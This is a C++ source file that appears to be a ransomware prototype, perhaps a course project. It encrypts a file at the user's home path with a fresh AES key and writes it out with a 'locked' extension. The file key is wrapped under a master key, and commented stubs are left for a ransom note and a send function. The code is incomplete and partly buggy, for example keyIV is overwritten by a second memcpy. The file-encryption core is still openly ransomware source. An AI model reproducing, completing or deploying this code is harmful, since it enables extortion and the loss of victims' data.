#include "Encryption.h"
#ifdef ENC

using namespace boost::filesystem;
using std::string;

void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);

string get_username();
string get_home();
void send();
void notify();
DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);


DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);


int main(int argc, char* argv[]) {
//	crypt_data* d = generatekey();//TODO also move to encrypt
	PBYTE masterIV, masterKey;
	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
#ifdef DEBUG
	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
#else
	string path = get_home();
#endif

	encrypt(path, masterIV, masterKey);
//	iterate(path);

//#ifdef DEBUG
//	std::cout << "Username: " << get_username() << std::endl;
//	encrypt(d, "./README.md");
//#endif
//
//	send();
//
//	delete d;
//
//	notify();
//
	return 0;
}

DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
{
	DWORD status;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle;
	status = getKeyHandle(masterKey, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		//cleanup
	}
	memcpy(tmpIv, masterIV, IV_LEN);
	DWORD  resSize;

	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, BCRYPT_PAD_NONE);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	return status;
}

DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status;
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void initPlainText(string path, PBYTE *buffer, size_t buffSize)
{
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	*buffer = new BYTE[buffSize + 1];
	char c;
	for (size_t i = 0; i < buffSize; ++i) {
		plaintextFile.get(c);
		(*buffer)[i] = c;
	}
	(*buffer)[buffSize] = '\0';
	plaintextFile.close();
}

void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
{
	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; //TODO 2 is the number of digits in IV_LEN, might wanna change that programatically
	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
	ofile.write((char*)cipherText, cipherLen);
	ofile.close();
}

DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	DWORD status;

	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		return status;

	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
{
	DWORD status;
	PBYTE plainText = NULL;
	size_t plainTextLen = getFileSize(path);
	
	initPlainText(path, &plainText, plainTextLen);

	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		//TODO cleanup
		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
	}
	//keep in persistant file


#ifdef DEBUG
	// Print key and initialization vector
	std::cout << "Key:\t\t" << key << std::endl;
	std::cout << "IV:\t\t" << iv << std::endl;
	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
#endif
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle;
	status = getKeyHandle(key, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		//cleanup
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}

	PBYTE cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		//cleanup
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif
	PBYTE keyIVBuff = nullptr;
	PBYTE keyIV = nullptr;
	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	if(keyIVBuff == nullptr)
	{
		//TODO cleanup
	}
	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	if (keyIV == nullptr)
	{
		//TODO cleanup
	}
	memcpy(keyIV,key,KEY_LEN);
	memcpy(keyIV, iv, IV_LEN);
	
	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
	
	//TODO CLEANUP!!!!!
	delete plainText;
}


//string get_username() {
//#ifdef _WIN32
//	char username[UNLEN + 1];
//	DWORD length = UNLEN + 1;
//	GetUserName(username, &length);
//
//	return string(username);
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_name);
//	}
//
//	return EMPTY;
//#endif
//}
//
//string get_home() {
//#ifdef _WIN32
//	string path;
//
//	char* drive = getenv("USERPROFILE");
//	if (drive == NULL) {
//		throw runtime_error("USERPROFILE environment variable not found");
//	}
//	else {
//		path = drive;
//	}
//
//	return path;
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_dir);
//	}
//
//	return EMPTY;
//#endif
//}
//
//void notify() {
//	if (OPEN_FILE) {
//		std::ofstream ofile(NOTIFY_FILENAME);
//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
//		ofile.close();
//
//		system((string("start ") + NOTIFY_FILENAME).c_str());
//	}
//}
//
//void send() {
//
//}
#endif